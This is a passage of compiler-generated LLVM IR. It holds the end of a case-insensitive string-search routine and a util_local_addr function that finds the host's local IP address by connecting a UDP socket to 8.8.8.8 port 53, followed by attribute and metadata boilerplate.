  %50 = load i8, i8* %12, align 1
  %51 = sext i8 %50 to i32
  %52 = icmp sle i32 %51, 90
  br i1 %52, label %53, label %57

53:                                               ; preds = %49
  %54 = load i8, i8* %12, align 1
  %55 = sext i8 %54 to i32
  %56 = or i32 %55, 96
  br label %60

57:                                               ; preds = %49, %43
  %58 = load i8, i8* %12, align 1
  %59 = sext i8 %58 to i32
  br label %60

60:                                               ; preds = %57, %53
  %61 = phi i32 [ %56, %53 ], [ %59, %57 ]
  %62 = trunc i32 %61 to i8
  store i8 %62, i8* %12, align 1
  %63 = load i8, i8* %11, align 1
  %64 = sext i8 %63 to i32
  %65 = load i8, i8* %12, align 1
  %66 = sext i8 %65 to i32
  %67 = icmp eq i32 %64, %66
  br i1 %67, label %68, label %81

68:                                               ; preds = %60
  %69 = load i32, i32* %10, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %10, align 4
  %71 = load i32, i32* %9, align 4
  %72 = icmp eq i32 %70, %71
  br i1 %72, label %73, label %80

73:                                               ; preds = %68
  %74 = load i8*, i8** %8, align 8
  %75 = load i8*, i8** %5, align 8
  %76 = ptrtoint i8* %74 to i64
  %77 = ptrtoint i8* %75 to i64
  %78 = sub i64 %76, %77
  %79 = trunc i64 %78 to i32
  store i32 %79, i32* %4, align 4
  br label %84

80:                                               ; preds = %68
  br label %82

81:                                               ; preds = %60
  store i32 0, i32* %10, align 4
  br label %82

82:                                               ; preds = %81, %80
  br label %16, !llvm.loop !65

83:                                               ; preds = %16
  store i32 -1, i32* %4, align 4
  br label %84

84:                                               ; preds = %83, %73
  %85 = load i32, i32* %4, align 4
  ret i32 %85
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_local_addr() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %6 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 0, i32* %2, align 4
  store i32 16, i32* %4, align 4
  %7 = call i32* @__errno_location() #8
  store i32 0, i32* %7, align 4
  %8 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 0) #7
  store i32 %8, i32* %2, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %0
  store i32 0, i32* %1, align 4
  br label %35

11:                                               ; preds = %0
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = call i32 @htonl(i32 noundef 134744072) #8
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %15 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  store i32 %13, i32* %15, align 4
  %16 = call zeroext i16 @htons(i16 noundef zeroext 53) #8
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = load i32, i32* %2, align 4
  %19 = bitcast %union.__CONST_SOCKADDR_ARG* %5 to %struct.sockaddr**
  %20 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %20, %struct.sockaddr** %19, align 8
  %21 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %5, i32 0, i32 0
  %22 = load %struct.sockaddr*, %struct.sockaddr** %21, align 8
  %23 = call i32 @connect(i32 noundef %18, %struct.sockaddr* %22, i32 noundef 16)
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %union.__CONST_SOCKADDR_ARG* %6 to %struct.sockaddr**
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %26, %struct.sockaddr** %25, align 8
  %27 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %6, i32 0, i32 0
  %28 = load %struct.sockaddr*, %struct.sockaddr** %27, align 8
  %29 = call i32 @getsockname(i32 noundef %24, %struct.sockaddr* %28, i32* noundef %4) #7
  %30 = load i32, i32* %2, align 4
  %31 = call i32 @close(i32 noundef %30)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %33 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 4
  store i32 %34, i32* %1, align 4
  br label %35

35:                                               ; preds = %11, %10
  %36 = load i32, i32* %1, align 4
  ret i32 %36
}

; Function Attrs: nounwind
declare i32 @getsockname(i32 noundef, %struct.sockaddr*, i32* noundef) #1

attributes #0 = { noinline nounwind sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { argmemonly nofree nounwind willreturn }
attributes #7 = { nounwind }
attributes #8 = { nounwind readnone willreturn }
attributes #9 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.6"}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"PIE Level", i32 2}
!4 = !{i32 7, !"uwtable", i32 1}
!5 = !{i32 7, !"frame-pointer", i32 2}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
!38 = distinct !{!38, !7}
!39 = distinct !{!39, !7}
!40 = distinct !{!40, !7}
!41 = distinct !{!41, !7}
!42 = distinct !{!42, !7}
!43 = distinct !{!43, !7}
!44 = distinct !{!44, !7}
!45 = distinct !{!45, !7}
!46 = distinct !{!46, !7}
!47 = distinct !{!47, !7}
!48 = distinct !{!48, !7}
!49 = distinct !{!49, !7}
!50 = distinct !{!50, !7}
!51 = distinct !{!51, !7}
!52 = distinct !{!52, !7}
!53 = distinct !{!53, !7}
!54 = distinct !{!54, !7}
!55 = distinct !{!55, !7}
!56 = distinct !{!56, !7}
!57 = distinct !{!57, !7}
!58 = distinct !{!58, !7}
!59 = distinct !{!59, !7}
!60 = distinct !{!60, !7}
!61 = distinct !{!61, !7}
!62 = distinct !{!62, !7}
!63 = distinct !{!63, !7}
!64 = distinct !{!64, !7}
!65 = distinct !{!65, !7}
